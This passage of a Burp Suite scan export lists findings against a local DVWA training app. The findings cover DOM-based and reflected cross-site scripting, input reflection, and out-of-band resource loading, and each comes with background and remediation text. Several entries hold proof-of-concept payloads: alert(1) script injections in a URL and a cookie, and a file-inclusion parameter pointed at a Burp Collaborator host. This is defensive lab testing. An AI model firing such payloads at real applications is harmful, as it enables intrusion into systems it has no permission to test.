        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "100": {
        "\ufeffissue__serialNumber": "8.70465E+18",
        "issue__type": "2097936",
        "issue__name": "Cross-site scripting (DOM-based)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_d/",
        "issue__location": "/dvwa/vulnerabilities/xss_d/",
        "issue__severity": "High",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>\\n<p>DOM-based cross-site scripting arises when a script  writes controllable data into the HTML document in an unsafe way. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to visit the attacker's crafted URL in various ways, similar to the usual attack delivery vectors for reflected cross-site scripting vulnerabilities.</p>\\n\\n<p>Burp Suite automatically identifies this issue using static code analysis, which may lead to false positives that are not actually exploitable. The relevant code and execution paths should be reviewed to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>",
        "issue__remediationBackground": "<p>The most effective way to avoid DOM-based cross-site scripting vulnerabilities is not to dynamically write data from any untrusted source into the HTML document. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing script code into the document. In many cases, the relevant data can be validated on a whitelist basis, to allow only content that is known to be safe. In other cases, it will be necessary to sanitize or encode the data. This can be a complex task, and depending on the context that the data is to be inserted may need to involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence. </p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/dom-based\">Web Security Academy: DOM-based cross-site scripting</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n\t<li><a href=\"https://capec.mitre.org/data/definitions/588.html\">CAPEC-588: DOM-Based XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to DOM-based cross-site scripting. Data is read from <b>document.location.href</b> and passed to <b>document.write()</b>.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "document.location.href",
        "issue__staticAnalysis__sink": "document.write()",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8);",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "document.write(\"<option value='\" + lang + \"'>\" + decodeURI(lang) + \"</option>\");",
        "issue__dynamicAnalysis__source": "location.href",
        "issue__dynamicAnalysis__sink": "document.write",
        "issue__dynamicAnalysis__sourceStackTrace": "at Object._0x33d7c2 [as proxiedGetterCallback] (<anonymous>:1:588475)\\nat Object.get href [as href] (<anonymous>:1:298487)\\nat https://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English:69:36",
        "issue__dynamicAnalysis__sinkStackTrace": "at Object.Lixzr (<anonymous>:1:175099)\\nat Object.jNwri (<anonymous>:1:573993)\\nat _0x5d9df9 (<anonymous>:1:590480)\\nat Object.GvThk (<anonymous>:1:172421)\\nat Object.mHBUy (<anonymous>:1:493848)\\nat Object.SPRUB (<anonymous>:1:507129)\\nat Object.yRKLW (<anonymous>:1:508761)\\nat HTMLDocument.write (<anonymous>:1:509996)\\nat https://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English:70:16",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "?default=ozp85p80qf%27%22`'\"/ozp85p80qf/><ozp85p80qf/\\>lgqkya4qci&English",
        "issue__dynamicAnalysis__sinkValue": "<option value='ozp85p80qf%27%22`'\"/ozp85p80qf/><ozp85p80qf/\\>lgqkya4qci&English'>ozp85p80qf'\"`'\"/ozp85p80qf/><ozp85p80qf/\\>lgqkya4qci&English</option>",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "https://localhost:8888/dvwa/vulnerabilities/xss_d/?default='\"/onmouseover=alert(1)//English",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "FALSE",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "101": {
        "\ufeffissue__serialNumber": "3.0144E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/weak_id/",
        "issue__location": "/dvwa/vulnerabilities/weak_id/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "102": {
        "\ufeffissue__serialNumber": "7.59396E+18",
        "issue__type": "1051136",
        "issue__name": "Out-of-band resource load (HTTP)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [page parameter]",
        "issue__severity": "High",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Out-of-band resource load arises when it is possible to induce an application to fetch content from an arbitrary external location, and incorporate that content into the application's own response(s). The ability to trigger arbitrary out-of-band resource load does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. \\nHowever, in many cases, it can indicate a vulnerability with serious consequences.</p>\\n<p>The ability to request and retrieve web content from other systems can allow the application server to be used as a two-way attack proxy. \\n  By submitting suitable payloads, an attacker can cause the application server to attack, or retrieve content from, other systems that it can interact with. \\n  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. \\n  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>\\n<p>Additionally, the application's processing of web content that is retrieved from arbitrary URLs exposes some important and non-conventional attack surface. \\n  An attacker can deploy a web server that returns malicious content, and then induce the application to retrieve and process that content. \\n  This processing might give rise to the types of input-based vulnerabilities that are normally found when unexpected input is submitted directly in requests to the application. \\n  The out-of-band attack surface that the application exposes should be thoroughly tested for these types of vulnerabilities. </p>",
        "issue__remediationBackground": "<p>You should review the purpose and intended use of the relevant application functionality, and determine whether the ability to trigger arbitrary out-of-band resource load is intended behavior. \\n  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. \\n  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter. \\nYou should also ensure that content retrieved from other systems is processed in a safe manner, with the usual precautions that are applicable when processing input from direct incoming web requests.</p>\\n<p>If the ability to trigger arbitrary out-of-band resource load is not intended behavior, then you should implement a whitelist of permitted URLs, and block requests to URLs that do not appear on this whitelist.</p>",
        "issue__references": "<ul>\\n  <li><a href=\"https://portswigger.net/blog/introducing-burp-collaborator\">Burp Collaborator</a></li>\\n  <li><a href=\"https://portswigger.net/burp/application-security-testing/oast\">Out-of-band application security testing (OAST)</a></li>\\n  <li><a href=\"https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface\">PortSwigger Research: Cracking the Lens</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/610.html\">CWE-610: Externally Controlled Reference to a Resource in Another Sphere</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/918.html\">CWE-918: Server-Side Request Forgery (SSRF)</a></li>\\n</ul>",
        "issue__issueDetail": "It is possible to induce the application to retrieve the contents of an arbitrary external URL and return those contents in its own response.<br><br>The payload <b>http://211iq4m9rbicw9zksx7sfhacd3jw7uvkjb61uq.burpcollaborator.net/?file1.php</b> was submitted in the <b>page</b> parameter.<br><br>The application performed an HTTP request to the specified domain. The response from that request was then included in the application's own response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "HTTP",
        "issue__collaboratorEvent__originIp": "49.228.238.103",
        "issue__collaboratorEvent__time": "2022-Mar-10 10:10:27 UTC",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "103": {
        "\ufeffissue__serialNumber": "1.09725E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/exec/",
        "issue__location": "/dvwa/vulnerabilities/exec/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>urnm6'&gt;&lt;script&gt;alert(1)&lt;/script&gt;rgjke</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "104": {
        "\ufeffissue__serialNumber": "6.79003E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/exec/",
        "issue__location": "/dvwa/vulnerabilities/exec/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "105": {
        "\ufeffissue__serialNumber": "4.61398E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_d/",
        "issue__location": "/dvwa/vulnerabilities/xss_d/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
